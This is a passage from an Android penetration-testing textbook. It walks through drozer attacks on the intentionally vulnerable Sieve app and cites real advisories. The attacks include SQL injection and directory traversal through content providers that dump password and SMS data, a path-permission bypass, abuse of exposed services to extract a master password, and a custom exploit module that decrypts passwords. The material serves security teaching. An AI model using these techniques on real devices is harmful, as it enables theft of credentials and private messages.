snippet:\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProv\nider/Passwords --projection \"* from sqlite_master where type='table'--\"\n| type | name | tbl_name | rootpage | sql |\n| table | android_metadata | android_metadata | 3 | CREATE TABLE\nandroid_metadata (locale TEXT) |\n| table | Passwords | Passwords | 4 | CREATE TABLE\nPasswords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password\nBLOB,email ) |\n| table | Key | Key | 5 | CREATE TABLE\nKey (Password TEXT PRIMARY KEY,pin TEXT )\nAny one of the available tables can now be queried. Remember the /Keys path that required a permission in\norder to read? The associated “Key” table can now be extracted using the injection point:\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProv\nider/Passwords --projection \"* from Key--\"\n| Password | pin |\n| Thisismylongpassword123 | 1234 |\nThis shows a complete compromise of the password manager’s master password and pin used to protect the\ndata. This is an old web vulnerability that now can exist in Android applications implementing content\nproviders.\nYou can automate the detection of SQL injection vulnerabilities using drozer in conjunction with the\nscanner.provider.injection module.\ndz> run scanner.provider.injection -a content://com.mwr.example.sieve.DB\nContentProvider/Passwords\n...\nInjection in Projection:\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords\nInjection in Selection:\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords\nYou can also automatically find the available tables to query in drozer.\ndz> run scanner.provider.sqltables -a content://com.mwr.example.sieve.DB\nContentProvider/Passwords\nAccessible tables for uri content://com.mwr.example.sieve.DBContentProvi\nder/Passwords:\nandroid_metadata\nPasswords\nKey\nNOTE\nYou can also use these modules with a -a option that allows you to provide the package name and not a\ncontent URI. However, this simply uses the finduri method explained earlier to find content URIs and\nthen tries SQL injection against discovered paths. This is not recommended if you are performing a\ncomprehensive assessment of an application as there are known pitfalls with the finduri method that was\nexplained earlier.\nUSING EXISTING TOOLS TO FIND SQL INJECTION\nMapping content providers to a web interface is also possible by using a module in drozer at\nauxiliary.webcontentresolver. This essentially allows you to use existing established tools like sqlmap\n(see http://sqlmap.org/) to exploit content providers. To start this module, run it with the specified port\nthat it must bind a web server to:\ndz> run auxiliary.webcontentresolver -p 9999\nWebContentResolver started on port 9999.\nCtrl+C to Stop\nNow browsing to http://localhost:9999 will show all content providers on the device as well as some\ninformation about them. You can target and exploit specific content providers through this web interface\nin the same way as SQL injection would be tested in a normal web application. Browsing to the following\naddress returns the same SQL injection message presented earlier in this section:\nhttp://localhost:9999/query?\nuri=content://com.mwr.example.sieve.DBContentProvider/Passwords&projection=%27&selection=&selectionSort=\nFigure 7.9 shows the returned output.\nFigure 7.9 Finding SQL injection using drozer’s WebContentResolver web interface\nREAL-WORLD EXAMPLE: MULTIPLE SAMSUNG (ANDROID) APPLICATION\nVULNERABILITIES\nOn December 13, 2011, Tyrone Erasmus and Michael Auty from MWR InfoSecurity issued an advisory\ncontaining a number of content provider vulnerabilities in pre-installed applications on Samsung devices.\nThese issues allowed the retrieval of the following content from a completely unprivileged application:\nEmail address\nEmail password\nEmail contents\nInstant messages\nInstant messaging contacts\nSocial networking messages\nSMS messages\nCall logs\nGPS location\nNotes from various applications\nPortable Wi-Fi hotspot credentials\nThese were discovered by examining all content providers of the pre-installed applications on the device.\nAll of this information could be retrieved because the content providers did not enforce a read permission\nin their manifest files. A SQL injection vulnerability was also discovered in the\ncom.android.providers.telephony package that allowed the retrieval of all SMS messages. This was\npossible because Samsung modified this package to include a content provider with a content URI of\ncontent://channels that shared the same SQLite database with the content://sms content provider. The\nchannels content provider did not require any permissions and contained a SQL injection vulnerability.\nThe steps of exploiting this SQL injection are detailed here.\nUsing drozer shows the content providers inside the com.android.providers .telephony package:\ndz> run app.provider.info -a com.android.providers.telephony\nPackage: com.android.providers.telephony\nAuthority: telephony\nRead Permission: null\nWrite Permission: null\nContent Provider: com.android.providers.telephony.TelephonyProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: False\nAuthority: nwkinfo\nRead Permission: null\nWrite Permission: null\nContent Provider: com.android.providers.telephony.NwkInfoProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: False\nAuthority: sms\nRead Permission: android.permission.READ_SMS\nWrite Permission: android.permission.WRITE_SMS\nContent Provider: com.android.providers.telephony.SmsProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: False\nAuthority: mms\nRead Permission: android.permission.READ_SMS\nWrite Permission: android.permission.WRITE_SMS\nContent Provider: com.android.providers.telephony.MmsProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: True\nUri Permission Patterns:\nPath: /part/\nType: PATTERN_PREFIX\nPath: /drm/\nType: PATTERN_PREFIX\nAuthority: mms-sms\nRead Permission: android.permission.READ_SMS\nWrite Permission: android.permission.WRITE_SMS\nContent Provider: com.android.providers.telephony.MmsSmsProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: False\nAuthority: channels\nRead Permission: null\nWrite Permission: null\nContent Provider: com.android.providers.telephony.ChannelsProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: False\nQuerying the channel’s content provider returns no interesting information:\ndz> run app.provider.query content://channels\n| _id | channel_id | channel_name | is_checked |\nQuerying this content provider with a projection of a single quote character (') reveals a SQL injection\nvulnerability:\ndz> run app.provider.query content://channels --projection \"'\"\nunrecognized token: \"' FROM mychannels\": , while compiling: SELECT ' FROM\nmychannels\nUsing this injection point, all the tables in the database can be discovered.\ndz> run scanner.provider.sqltables -a content://channels\nAccessible tables for uri content://channels:\nandroid_metadata\npdu\nsqlite_sequence\naddr\npart\nrate\ndrm\nsms\nraw\nattachments\nsr_pending\nwpm\ncanonical_addresses\nthreads\npending_msgs\nmychannels\nwords\nwords_content\nwords_segments\nwords_segdir\nThe most interesting table discovered is the sms table. Using SQL injection, the contents of this table can\nbe dumped.\ndz> run app.provider.query content://channels --projection \"* from sms\n--\"\n| _id | thread_id | address | person | date | protocol\nl | read | status | type | reply_path_present | subject | body |\nservice_center | locked | error_code | seen | deletable | hidden |\ngroup_id | group_type | delivery_date |\n| 1 | 1 | O2Roaming | null | 1402775640138 | 0\n| 1 | -1 | 1 | 0 | null | While\naway you can top-up just like at home by calling 4444 using your\ndebit or credit card for payment. Enjoy your trip! | +447802000332\n| 0 | 0 | 1 | 1 | 0 | null | null\n| null |\n| 2 | 2 | +27820099985 | null | 1402776248043 | 0\n| 1 | -1 | 1 | 0 | null | You have inserted\nyour SIM card in another cellphone. To request cellphone settings, reply\n'yes' (free SMS) and Vodacom will send the settings to you. ...\nThis completely bypasses the need for an application to hold the READ_SMS permission on this device. You\ncan find more information in the advisory on this issue at\nhttps://labs.mwrinfosecurity.com/system/assets/303/original/mwri_samsung_vulnerabilities_2011-\n12-13.pdf.\nFile-Backed Content Providers\nImplementing a content provider that allows other applications to retrieve files in a structured and secure way is\npossible. However, the mechanisms for doing so can be prone to vulnerabilities that allow the retrieval of\narbitrary files under the UID of the content provider’s application. You can programmatically create these\ncontent providers by implementing a public ParcelFileDescriptor openFile(Uri, String) method. If the URI\nbeing requested is not strictly validated against a whitelist of allowed files or folders, this opens up the\napplication to attack. An easy way to check whether a content provider allows the retrieval of any file is by\nrequesting the /system/etc/hosts file, which always exists and is word readable on Android devices. The\nfollowing example shows how to exploit one such content provider in Sieve to retrieve /system/etc/hosts:\ndz> run app.provider.read content://com.mwr.example.sieve.FileBackupProv\nider/system/etc/hosts\n127.0.0.1 localhost\nThis example shows that you are not restricted to only querying intended files and can request any file on the\nfilesystem that Sieve has access to. Depending on the application, different files may be deemed good targets. In\nthe case of the Sieve application, the most important file it can access is its database that holds all the passwords\nand application configuration. This is located in the private data directory of the application in the /databases/\nfolder.\nroot@android:/ # ls /data/data/com.mwr.example.sieve/databases/\ndatabase.db\ndatabase.db-journal\nNext you can attempt to read this file from drozer, which should not be able to access it at all:\ndz> run app.provider.read content://com.mwr.example.sieve.FileBackupProv\nider/data/data/com.mwr.example.sieve/databases/database.db > database.db\nThis exploit works and the file is transferred from the content provider to your local computer using this\nvulnerability. Dumping the contents of this database reveals all of its data, including the master password and\npin. To verify this, use the sqlite3 tool to view the contents:\n$ sqlite3 database.db .dump\nPRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE android_metadata (locale TEXT);\nINSERT INTO \"android_metadata\" VALUES('en_US');\nCREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TE\nXT,password BLOB,email );\nINSERT INTO \"Passwords\" VALUES(1,'Gmail','tyrone',X'CC0EFA591F665110CD34\n4C384D48A2755291B8A2C46A683987CE13','tyrone@gmail.com');\nINSERT INTO \"Passwords\" VALUES(2,'Internet Banking','tyrone123',X'5492FB\nCE841D11EC9E610076FC302B94DBF71B59BE7E95821248374C5529514B62','tyrone@gm\nail.com');\nCREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT );\nINSERT INTO \"Key\" VALUES('Thisismylongpassword123','1234');\nCOMMIT;\nIf the URI path provided to the openFile()function had been prepended with a static path in code that confined\nit to the /data/data/com.mwr.example.sieve/ directory, how would you retrieve this file? Our intention in this\ncode is to restrict file reads to a certain directory only. In this case it may be possible to traverse out of the given\ndirectory and access any file if the code does not properly perform proper input validation. If a prepended path\nexisted on the FileBackupProvider, you could use a directory traversal attack as follows to still retrieve\ndatabase.db:\ndz> run app.provider.read content://com.mwr.example.sieve.FileBackupProv\nider/../../../../data/data/com.mwr.example.sieve/databases/database.db >\ndatabase.db\nThe appropriate amount of traverses would have to be determined by trial and error or by examining the source\ncode of the content provider.\nA scanner module in drozer allows you to detect directory traversal attacks against file-backed content providers\nas shown here:\ndz> run scanner.provider.traversal -a content://com.mwr.example.sieve.Fi\nleBackupProvider\n...\nVulnerable Providers:\ncontent://com.mwr.example.sieve.FileBackupProvider\nREAL-WORLD EXAMPLE: SHAZAM\nOn September 10, 2012, Sebastián Guerrero Selma issued an advisory containing information about a\ndirectory traversal vulnerability in the Shazam Android application. The proof of concept given showed\nthat reading from the following Shazam content provider would successfully retrieve the HOSTS file:\ndz> run app.provider.read content://com.shazam.android.AdMarvelCachedIma\ngeLocalFileContentProvider/../../../../../../../../system/etc/hosts\n127.0.0.1 localhost\nAn attacker could use this to get any files contained within the private data directory of the Shazam\napplication. The original advisory is at http://blog .seguesec.com/2012/09/path-traversal-\nvulnerability-on- shazam-android-application/.\nPattern-Matching Flaws\nIn all aspects of computer security, logic flaws can exist. Rewinding back to where we discovered information\nabout the Sieve content providers, have a look again at the type of comparison being used to define a permission\non the /Keys path:\nAuthority: com.mwr.example.sieve.DBContentProvider\nRead Permission: null\nWrite Permission: null\nContent Provider: com.mwr.example.sieve.DBContentProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: False\nPath Permissions:\nPath: /Keys\nType: PATTERN_LITERAL\nRead Permission: com.mwr.example.sieve.READ_KEYS\nWrite Permission: com.mwr.example.sieve.WRITE_KEYS\nThe comparison is done using a literal check. You can find the original form of this check that drozer parsed out\nin the following snippet of Sieve’s manifest:\n<provider name=\".DBContentProvider\"\nexported=\"true\"\nmultiprocess=\"true\"\nauthorities=\"com.mwr.example.sieve.DBContentProvider\">\n<path-permission readPermission=\"com.mwr.example.sieve.READ_KEYS\"\nwritePermission=\"com.mwr.example.sieve.WRITE_KEYS\"\npath=\"/Keys\">\n</path-permission>\n</provider>\nOn the <path-permission> tag, the path attribute was used. The definition of the path attribute is as follows\nfrom http://developer.android.com/guide/topics/manifest/path-permission-element.html:\nA complete URI path for a subset of content provider data. Permission can be granted only to the particular\ndata identified by this path...\nThe key word in this definition is particular. This means that only the /Keys path is being protected by this\npermission. What about the /Keys/ path? Querying the /Keys path you get a permission denial:\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProv\nider/Keys\nPermission Denial: reading com.mwr.example.sieve.DBContentProvider uri\ncontent://com.mwr.example.sieve.DBContentProvider/Keys from pid=1409,\nuid=10059 requires com.mwr.example.sieve.READ_KEYS, or\ngrantUriPermission()\nBut when you query the /Keys/ path you get the following:\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProv\nider/Keys/\n| Password | pin |\n| Thisismylongpassword123 | 1234 |\nThis specific path including the appended slash was not protected by that permission. This is because a literal\ncomparison was used when there were other valid forms that reached the same data. Many other different types\nof pattern-matching flaws could exist in an application that the reader would have to assess on a case-by-case\nbasis; however, this serves as an easy introduction to this vulnerability class on Android.\nAttacking Insecure Services\nServices are often used to run code inside an application that is important to keep running, even when the\napplication is not in the foreground. This scenario may apply to many applications or simply be used by a\ndeveloper for good application lifecycle management. Services can be started in a similar way to activities, with\nan intent. These types of services can perform long-running tasks in the background. However, a second mode\nof operation, which allows an application to bind to the service and pass messages to and from them over the\nsandbox, also exists. This section explores attacking both of these types of services.\nUnprotected Started Services\nIf a service is exported, either explicitly or implicitly, other applications on the device can interact with it.\nStarted services are ones that implement the onStartCommand() method inside its class. This method receives\nintents destined for this service from applications and may be a source of vulnerabilities for an attacker. This is\ncompletely dependent on what the code does inside this function. The code may perform an unsafe task even\njust by being started or may use parameters that are sent and when certain conditions take place, perform an\nunexpected action. This may seem like high-level information but it is because simply too many types of\nproblems exist that code could exhibit to mention here. The only way you can ferret out such problems is by\nreading the code to understand what it is doing and find whether the potential exists to abuse it in some way. To\ninteract with started services use the app.service.start module in drozer.\nREAL-WORLD EXAMPLE: CLIPBOARDSAVESERVICE ON SAMSUNG DEVICES\nOn July 31, 2012, André Moulu blogged about how a completely unprivileged application with no\npermissions can escalate privileges in order to install another package by abusing application components.\nLet us zoom into one of the vulnerabilities that he used so you can see how to copy an arbitrary file to the\nSD card and thus overcome the need for the WRITE_EXTERNAL_STORAGE permission.\nHe discovered that a started service was exported in com.android.clipboardsaveservice that could be\nused to copy a file from one location to another. This package also held the WRITE_EXTERNAL_STORAGE\npermission, meaning that it could also copy to the SD card. Here is the proof of concept given by André:\n$ adb shell am startservice -a com.android.clipboardsaveservice.CLIPBOAR\nD_SAVE_SERVICE --es copyPath /sdcard/bla --es pastePath /sdcard/restore/\n$ adb shell \"ls -l /sdcard/restore/bla\"\n-rw-rw-r-- root sdcard_rw 5 2012-07-31 01:24 bla\nThis is a perfect example of a started service that uses provided extras to perform an action. The equivalent\ncommand in drozer is as follows:\ndz> run app.service.start --action com.android.clipboardsaveservice.CLIP\nBOARD_SAVE_SERVICE --extra string copyPath /sdcard/bla --extra string\npastePath /sdcard/restore/\nTo find more information about this vulnerability go to http://sh4ka.fr/\nandroid/galaxys3/from_0perm_to_INSTALL_PACKAGES_on_galaxy_S3.html.\nIn a similar way to other application components, you can start and stop services from a privileged context even\nwhen they are not exported. You can do this by making use of the startservice and stopservice features of the\nam utility.\nUnprotected Bound Services\nBound services provide a mechanism for applications on a device to interconnect directly with each other using\nremote procedure calls (RPCs). Bound services implement the onBind() method inside their service class. This\nmethod must return an IBinder, which is part of the remote procedure call mechanism. An application can\nimplement a bound service in three ways, only two of which the application can use over the sandbox. These are\nas follows:\nExtending the Binder class—By returning an instance of the service class in the onBind method, it\nprovides the caller with access to public methods within the class. However, this is not possible across the\nsandbox and can only be bound to by other parts of the same application’s code that is running in the same\nprocess.\nUsing a messenger—By returning the IBinder of a Messenger class that has implemented a handler, the\napplications can send messages between each other. These messages are defined by the Message class. As\npart of a Message object, a “message code,” which is defined as the what variable, is specified and compared\nagainst predefined values in the class’s handler code to perform different actions according to this value.\nSending arbitrary objects inside the Message object that can be used by the receiving code is also possible.\nHowever, there is no direct interaction with methods when using this technique.\nUsing AIDL (Android Interface Definition Language)—Makes methods in an application available to\nother applications over the sandbox using Inter-Process Communication (IPC). It performs marshalling of\ncommon Java types and abstracts the implementation from the user. The way that developers use AIDL is by\npopulating .aidl files in the source code folder that contains information that defines an interface and\nduring compilation time generates a Binder interface from these files. This essentially converts the human-\nfriendly .aidl files into a Java class that can be invoked from code. Applications that have bound to a service\nof this nature with the correct Binder class generated from the same AIDL can make use of the remote\nmethods available. Entire objects of custom classes can be sent using this method, as long as both the client\nand service have the code of this class available and the class implements the Parcelable protocol. You can\nexplore this deeply technical method further in its documentation at\nhttp://developer.android.com/guide/components/aidl.html. In our experience, very few application\ndevelopers attempt to make use of AIDL, simply because it is difficult to use and often not necessary. For the\nlarge majority of cases, using a messenger instead of AIDL is easier and provides all that is needed to\ncommunicate across applications.\nYou can find the official documentation on bound services at http://developer\n.android.com/guide/components/bound-services.html.\nAttacking a Messenger Implementation\nThe attack surface of each service depends on what is being exposed by the technique in use. The easiest starting\npoint for examining bound services making use of messengers is reading the handleMessage() method in the\nservice code. This tells you what kinds of messages are expected and how the application executes different\nfunctions accordingly. After you discover an attack path, you can investigate and interact with it from drozer\nusing the app.service.send module. The Sieve application contains two exposed services that both implement\nmessengers. We discovered this by first finding these services and then reading their classes and checking which\none of the explained techniques was applied.\ndz> run app.service.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\ncom.mwr.example.sieve.AuthService\nPermission: null\ncom.mwr.example.sieve.CryptoService\nPermission: null\nLooking at the AuthService source code reveals that it deals with the checking of passwords and PIN codes\nentered by the application. The following shows some important constants defined and a commented high-level\nview of the source code of the handleMessage()function:\n...\nstatic final int MSG_CHECK = 2354;\nstatic final int MSG_FIRST_LAUNCH = 4;\nstatic final int MSG_SET = 6345;\n...\npublic void handleMessage(Message r9_Message) {\n...\nBundle r0_Bundle = (Bundle) r9_Message.obj;\n...\nswitch (r9_Message.what) {\ncase MSG_FIRST_LAUNCH:\n...\n//Check if pin and password are set\n...\ncase MSG_CHECK:\n...\nif (r9_Message.arg1 == 7452) {\n...\n//Return pin\n//Requires password from bundle\n...\n}\n} else if (r9_Message.arg1 == 9234) {\n...\n//Returns password\n//Requires pin from bundle\n...\n}\n} else {\nsendUnrecognisedMessage();\nreturn;\n}\n...\ncase MSG_SET:\nif (r9_Message.arg1 == 7452) {\n...\n//Set password\n//Requires current password from bundle\n...\n} else if (r9_Message.arg1 == 9234) {\n...\n//Set pin\n//Requires current pin from bundle\n...\n}\n} else {\nsendUnrecognisedMessage();\nreturn;\n}\n...\n}\n...\n}\nEarlier in this chapter we noted that the Sieve application encrypts each of the passwords in its database.\nFurther investigation of the code used to encrypt these passwords would reveal that the master key for the\napplication is used as direct input to the key for the AES algorithm that is used. If no other vulnerability exists\nin Sieve that allows the retrieval of the password or pin, the AuthService could still be abused for this\ninformation—in particular, the code path that allows another application to retrieve the password if the pin is\nprovided. The following shows this attack in drozer:\ndz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve\n.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve\n.PIN 1234 --bundle-as-obj\nGot a reply from com.mwr.example.sieve/com.mwr.example.sieve\n.AuthService:\nwhat: 5\narg1: 41\narg2: 0\nExtras\ncom.mwr.example.sieve.PASSWORD (String) : Thisismylongpassword123\nThe password was successfully retrieved. If an attacking application did not know the PIN code, it could\ncomfortably brute-force this value because it is only four characters long. This attack could be performed\nmanually or in an automated fashion by an application. Sending an incorrect pin of 7777 yields the following\nresponse, which only reflects the entered pin:\ndz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve\n.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve\n.PIN 7777 --bundle-as-obj\nGot a reply from com.mwr.example.sieve/com.mwr.example.sieve\n.AuthService:\nwhat: 5\narg1: 41\narg2: 1\nExtras\ncom.mwr.example.sieve.PIN (String) : 7777\nThe differences in responses to a valid PIN and an invalid PIN make it possible for an automated brute-forcer to\nknow when it stumbles upon the correct PIN. The CryptoService service exposed by Sieve takes input and uses\nthe provided key to encrypt or decrypt the data. Here is a view of the code that handles this:\n...\npublic static final String KEY = \"com.mwr.example.sieve.KEY\";\npublic static final int MSG_DECRYPT = 13476;\npublic static final int MSG_ENCRYPT = 3452;\npublic static final String PASSWORD = \"com.mwr.example.sieve.PASSWORD\";\npublic static final String RESULT = \"com.mwr.example.sieve.RESULT\";\npublic static final String STRING = \"com.mwr.example.sieve.STRING\";\n...\npublic void handleMessage(Message r7_Message) {\n...\nBundle r0_Bundle = (Bundle) r7_Message.obj;\nswitch (r7_Message.what) {\ncase MSG_ENCRYPT:\nr0_Bundle.putByteArray(RESULT,\nCryptoService.this.encrypt(\nr0_Bundle.getString(KEY),\nr0_Bundle.getString(STRING)));\n...\ncase MSG_DECRYPT:\nr0_Bundle.putString(RESULT,\nCryptoService.this.decrypt(\nr0_Bundle.getString(KEY),\nr0_Bundle.getByteArray(PASSWORD)));\n...\n}\n...\n}\n}\nTo encrypt a string using this service, the what parameter should be 3452 and the com.mwr.example.sieve.KEY\nand com.mwr.example.sieve.STRING values should be part of the bundle sent. Use drozer to test an encryption\noperation as follows:\ndz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve\n.CryptoService --msg 3452 2 3 --extra string com.mwr.example.sieve\n.KEY testpassword --extra string com.mwr.example.sieve.STRING \"string to\nbe encrypted\" --bundle-as-obj\nGot a reply from com.mwr.example.sieve/com.mwr.example.sieve\n.CryptoService:\nwhat: 9\narg1: 91\narg2: 2\nExtras\ncom.mwr.example.sieve.RESULT (byte[]) : [89, 95, -78, 115, -23,\n-50, -34, -30, -107, -1, -41, -35, 0, 7, 94, -77, -73, 90, -6, 79,\n-60, 122, -12, 25, -118, 62, -3, -112, -94, 34, -41, 14, -126, -101,\n-48, -99, -55, 10]\ncom.mwr.example.sieve.STRING (String) : string to be encrypted\ncom.mwr.example.sieve.KEY (String) : testpassword\nA byte array is returned with the ciphertext. Interacting with this service’s decryption functionality is tricky\nbecause the code expects a byte array containing the encrypted password (as com.mwr.example.sieve.PASSWORD).\nThe sending of byte arrays is not directly supported from drozer’s app.service.send module; you have to create\nyour own module to do the job. Here is an example module to do this:\nimport base64\nfrom drozer import android\nfrom drozer.modules import common, Module\nclass Decrypt(Module, common.ServiceBinding):\nname = \"Decrypt Sieve passwords\"\ndescription = \"Decrypt a given password with the provided key\"\nexamples = \"\"\nauthor = \"MWR InfoSecurity (@mwrlabs)\"\ndate = \"2014-07-22\"\nlicense = \"BSD (3 clause)\"\npath = [\"exploit\", \"sieve\", \"crypto\"]\npermissions = [\"com.mwr.dz.permissions.GET_CONTEXT\"]\ndef add_arguments(self, parser):\nparser.add_argument(\"key\", help=\"AES key\")\nparser.add_argument(\"base64_ciphertext\", help=\n\"the base64 ciphertext string to be decrypted\")\ndef execute(self, arguments):\n# Create a bundle with the required user input\nbundle = self.new(\"android.os.Bundle\")\nbundle.putString(\"com.mwr.example.sieve.KEY\", arguments.key)\nbundle.putByteArray(\"com.mwr.example.sieve.PASSWORD\",\nself.arg(base64.b64decode(arguments.base64_ciphertext),\nobj_type=\"data\"))\n# Define service endpoint and parameters\nbinding = self.getBinding(\"com.mwr.example.sieve\",\n\"com.mwr.example.sieve.CryptoService\")\nbinding.setBundle(bundle)\nbinding.setObjFormat(\"bundleAsObj\")\n# Send message and receive reply\nmsg = (13476, 1, 1)\nif binding.send_message(msg, 5000):\nself.stdout.write(\"%s\\n\" % binding.getData())\nelse:\nself.stderr.write(\"An error occured\\n\")\nTIP\nObserving the preceding code you will notice that a new android.os.Bundle object was instantiated using\nthe the self.new() method. This is drozer’s built-in method to instantiate an instance of a class using\nreflection. You will see this method being used often in drozer modules.\nThe user’s encrypted Gmail password retrieved from exploiting the content provider earlier was\nzA76WR9mURDNNEw4TUiidVKRuKLEamg5h84T. Testing this module with this value and the master password yields\nthe following result:\ndz> run exploit.sieve.crypto.decrypt Thisismylongpassword123 zA76WR9mURD\nNNEw4TUiidVKRuKLEamg5h84T\nExtras\ncom.mwr.example.sieve.PASSWORD (byte[]) : [-52, 14, -6, 89, 31, 102,\n81, 16, -51, 52, 76, 56, 77, 72, -94, 117, 82, -111, -72, -94,\n-60, 106, 104, 57, -121, -50, 19]\ncom.mwr.example.sieve.RESULT (String) : password123\ncom.mwr.example.sieve.KEY (String) : Thisismylongpassword123\nThe user’s Gmail password is shown in the com.mwr.example.sieve.RESULT value as password123.\nTIP\nWhen sending intents of any nature to an application component, observing the output of logcat at the\ntime the intent is sent is often insightful. This may provide useful information for debugging your attack\nparameters or confirming success.\nWhen using bound services, you may, depending on a multitude of factors, have to write custom code. Each\ndeveloper implements small things differently, like how the Bundle is retrieved from the Message object. The\ndefault way in which drozer expects that an application will receive its Bundle is by using the getData() method\non the Message object. However, some developers may use a different way to do this. For instance, Sieve casts\nthe obj attribute of the Message object directly to a Bundle. This means that if the correct method is not used\nwhen sending the message to the bound service, it will result in strange errors such as null pointer exceptions.\nSieve uses the following code to receive its Bundle:\nBundle r0_Bundle = (Bundle) r9_Message.obj;\nThis means that when using the app.service.send module, you need to use the --bundle-as-obj flag.\nAttacking an AIDL Implementation\nServices that make use of AIDL are some of the most cumbersome aspects to test on Android applications\nbecause the client that connects to the service needs to be custom written each time. The tester must generate a\nclass that implements the Binder interface by using its AIDL file. To convert this file from a .aidl file into a\n.java file you use the aidl binary that comes in the build-tools folder in the Android SDK:\n$ ./aidl /path/to/service.aidl\nAfter compiling this to a Java source file, you can import it into a custom application for testing or class-loaded\ninside drozer. Class-loading is easy inside drozer; here is a simple example module (classloading.py):\nfrom drozer.modules import common, Module\nfrom drozer.modules.common import loader\nclass Classloading(Module, loader.ClassLoader):\nname = \"Classloading example\"\ndescription = \"Classloading example\"\nexamples = \"\"\nauthor = [\"Tyrone (MAHH)\"]\ndate = \"2014-07-29\"\nlicense = \"BSD (3 clause)\"\npath = [\"app\", \"test\"]\ndef add_arguments(self, parser):\nparser.add_argument(\"name\", default=None, help=\"your name\")\ndef execute(self, arguments):\n# Class load the new class - this will be automatically compiled\nclassloadtest = self.loadClass(\"app/ClassLoadTest.apk\",\n\"ClassLoadTest\")\n# Create an instance of our class with name as argument\nclt = self.new(classloadtest, arguments.name)\n# Invoke Java function!\nprint clt.sayHello()\nThe class that was loaded in the previous code is written in Java and named ClassLoadTest.java. It is very basic\nand allows you to instantiate it with a name and contains a method that returns a friendly message containing\nthe name. This is shown here:\npublic class ClassLoadTest\n{\nString name;\npublic ClassLoadTest(String n)\n{\nthis.name = n;\n}\npublic String sayHello()\n{\nreturn \"Hi \" + this.name + \"!\";\n}\n}\nBy placing the Java file in the relative location specified in the self.loadClass() function, it will automatically\nget compiled and converted into an APK for use inside drozer. Running this new module in drozer is simple:\ndz> run app.test.classloading Tyrone\nHi Tyrone!\nERRORS COMPILING CUSTOM JAVA CLASSES\nMaking use of any version of javac other than 1.6 will result in errors during compilation that look similar\nto the following:\ntrouble processing:\nbad class file magic (cafebabe) or version (0033.0000)\n...while parsing ClassLoadTest.class\n...while processing ClassLoadTest.class\n1 warning\nno classfiles specified\nError whilst building APK bundle.\nThe default version of javac that the system uses can be changed by performing the following command\nand then selecting the correct version contained in JDK 1.6:\n$ sudo update-alternatives --config javac\nIn our experience, the use of AIDL implementations in applications is extremely rare. Thus, we do not explore\nthe issue further. You can find more information about interacting with AIDL services in the Google\ndocumentation at http://developer.android.com/guide/components/aidl.html.\nAbusing Broadcast Receivers\nBroadcast receivers have a variety of peculiarities and have functionality that one would not expect. Every day\nbroadcast receivers could be used to provide a notification of some event or potentially pass some piece of\ninformation to multiple applications at the same time. This section explores all the attack avenues that end in\nreaching a broadcast receiver in some way.\nUnprotected Broadcast Receivers\nIn the same way as all the other application components, broadcast receivers can specify a permission that the\ncaller must hold in order to interact with it. If an application makes use of a custom broadcast receiver and does\nnot specify a permission that the caller needs to hold, the application is exposing this component to abuse by\nother applications on the device. To find the broadcast receivers in an application, examine the manifest or the\napp.broadcast.info module in drozer:\ndz> run app.broadcast.info -a com.android.browser\nPackage: com.android.browser\ncom.android.browser.widget.BookmarkThumbnailWidgetProvider\nPermission: null\ncom.android.browser.OpenDownloadReceiver\nPermission: null\ncom.android.browser.AccountsChangedReceiver\nPermission: null\ncom.android.browser.PreloadRequestReceiver\nPermission: com.android.browser.permission.PRELOAD\nApplications can make use of the sendBroadcast()method and send broadcasts whose impact is determined\ncompletely by what code is run in the onReceive()method of the broadcast receivers that receive the sent intent.\nThis applies in exactly the same way for broadcast receivers that have been registered at runtime using the\nregisterReceiver()method. To discover broadcast receivers that have been registered at runtime you must\nsearch through the code of the application; drozer will not find them using the app .broadcast.info module.\nA subtle difference exists in the way that the sending of broadcasts works in comparison to other application\ncomponents. Broadcasts were intended to reach one or more recipients, unlike the sending of intents to other\ncomponents which only ends up at a single recipient. This lead to the design decision that any application can\nbroadcast an intent (as long as it’s not a predefined protected intent) and it is up to the broadcast receiver to\nspecify what permission the source application must hold in order for the broadcast receiver to acknowledge\nthis intent as valid. This also works the same in the other direction. When broadcasting an intent, you can\nspecify that only applications that hold a certain permission can receive the intent.\nSystem Broadcasts\nAlthough an application can broadcast most intents, a handful of intents are protected and can only be\nsent by system applications. A good example of an action that cannot be specified in an intent sent by a\nnon-system application is android .intent.action.REBOOT. This makes sense because it would not be a\nsecure design if any application could tell the device to reboot. To find a list of all the actions that you can\nset inside an intent and whether they are protected or not go to\nhttp://developer.android.com/reference/android/content/Intent.html.\nInterestingly, an application’s broadcast receiver has no way of determining which application sent an intent to\nit. The information could be inferred in various ways; for instance, if making use of a permission with a\nprotection level of signature it can be presumed that only another trusted application could have sent it.\nHowever, even this security feature is flawed under certain circumstances because of the Protection Level\nDowngrade Attack explained earlier in this chapter.\nThe following fictitious example demonstrates an application with a vulnerable broadcast receiver. You have to\nuse some imagination here because Sieve does not contain any broadcast receivers. The application does the\nfollowing:\n1. It has a login activity that accepts user credentials.\n2. This activity checks the entered credentials with a server on the Internet.\n3. If the credentials are correct, it sends a broadcast containing the action com.myapp.CORRECT_CREDS.\n4. A broadcast receiver with the following intent filter catches this intent:\n<receiver android:name=\".LoginReceiver\"\nandroid:exported=\"true\">\n<intent-filter>\n<action android:name=\"com.myapp.CORRECT_CREDS\" />\n</intent-filter>\n</receiver>\n5. If an intent arrives at the broadcast receiver with the correct action (com .myapp.CORRECT_CREDS), 